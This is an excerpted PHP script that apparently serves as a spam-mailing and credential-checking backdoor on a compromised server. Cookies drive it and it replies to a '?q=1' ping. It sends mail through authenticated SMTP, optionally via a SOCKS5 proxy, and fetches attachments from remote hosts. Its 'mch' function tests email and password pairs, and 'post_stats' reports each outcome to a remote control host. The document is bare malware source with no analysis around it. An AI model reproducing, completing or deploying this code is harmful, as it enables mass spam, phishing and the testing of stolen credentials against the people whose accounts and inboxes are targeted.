...
if (isset($_GET['q']) AND $_GET['q']=='1'){echo '200';exit;}
...
if(!$_COOKIE['a'])
{
	...
	if($_COOKIE['cm'])
	{
		$fname="=?".$_COOKIE['ch']."?Q?".str_replace("+","_",str_replace("%","=",urlencode($fname)))."?=";
	...
	if($_COOKIE['ht']=='1')
	{
		$body='<html><head><title>'.$subj.'</title>
	...
	if($_COOKIE['at'])
	{
		$att=$_COOKIE['at'];$atte = explode("^", urldecode($att));
		$afph=explode("/", $atte[0]);
		...
		$afp=fsockopen($affdom[0],$affdom[1],$errno,$errstr,$tout);
		...
		if($attext[1]=='jpg'){$attct='image/jpeg';}
		if($attext[1]=='jpeg'){$attct='image/jpeg';}
		if($attext[1]=='htm'){$attct='text/html';}
		if($attext[1]=='html'){$attct='text/html';}
	...
	if(empty($socks_host))
	{
		$fp = fsockopen($host,$port,$errno, $errstr, $tout);
	}else
	{
		$fp = fsockopen($socks_host,$socks_port,$errno,$errstr,$tout);
		...
		{
			$len_login = chr(strlen($socks_user));
			$len_pass  = chr(strlen($socks_pass));$h=pack("H*","01").$len_login.$socks_user.$len_pass.$socks_pass;
			fwrite($fp,$h);$result=bin2hex(fread($fp,4));if($result{3}!=0){$socks_stat='S1';fclose($fp);}else{$auth="socks5";}
		}else
		{
			fclose($fp);
	...
	if($code!=250){post_stats('E2'); fclose($fp); exit;}
	fputs($fp,"AUTH LOGIN\r\n");
	$code = substr(get_data($fp),0,3);
	...
	if($code!=334){post_stats('E4'); fclose($fp); exit;}
	fputs($fp,base64_encode($pass)."\r\n");
	$code = substr(get_data($fp),0,3);

	if($code!=235){post_stats('E5'); fclose($fp); exit;}
	$size_msg=strlen($header."\r\n".$body);
	fputs($fp,"MAIL FROM:<".$mail."> SIZE=".$size_msg."\r\n");
	$code = substr(get_data($fp),0,3);

	if($code!=250){post_stats('E6'); fclose($fp); exit;}
	fputs($fp,"RCPT TO:<".$mailto.">\r\n");
	$code = substr(get_data($fp),0,3);

	if($code!=250 AND $code!=251){post_stats('E7'); fclose($fp);exit;}
	fputs($fp,"DATA\r\n");
	$code = substr(get_data($fp),0,3);

	if($code!=354){post_stats('E8'); fclose($fp); exit;}
	fputs($fp,$header."\r\n".$body."\r\n.\r\n");
	$code = substr(get_data($fp),0,3);

	if($code!=250){post_stats('E9'); fclose($fp); exit;}
	fputs($fp,"QUIT\r\n");fclose($fp);
	post_stats('OK');
...
if($_COOKIE['a']=='c')
{
	...
	fclose($ping);
	$smtp=smtp_lookup($host);
	$lport=25;
	$try=mch($smtp,$lport,$em,$pass);
...
function post_stats($stat){//send stats

	global $tout, $sds, $rel, $socks, $mailto, $att;
	...
	socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array("sec" => $tout, "usec" => 0));

	if (!socket_connect($socket, $hp[0], $hp[1]))
	{
		socket_close($socket);
	}else{
		socket_write($socket, "GET http://".$sds."/post.php HTTP/1.1\r\nHost: ".$host[0]."\r\nCookie: ".$data."\r\n\r\n");socket_close($socket);
	}
}

function _host2int($host){//ip v bin
...
function mch($host,$port,$mail,$pass){//auth + send stats

	global $tout,$rel,$ehlo,$sds;$smtp_conn = fsockopen($host,$port,$errno,$errstr,$tout);
...
function smtp_lookup($host){
	...
	{
		win_COOKIEmxrr($host,$mxhosts,$mxweight);
		return $mxhosts[3];
	}
}

function win_COOKIEmxrr($hostname, &$mxhosts, &$mxweight=false){ //mx win
	...
	foreach($output as $line)
	{
		...
		{
			$mxweight[$i]=trim($parts[1]);$mxhosts[$i]=trim($parts[2]);
		}

		if(preg_match('/responsible mail addr = (.+)$/i',$line,$parts))
		{
			$mxweight[$i]=$i;$mxhosts[$i]=trim($parts[1]);
		}
	}
...
function post_mch($sds,$stat,$rel){//cheker
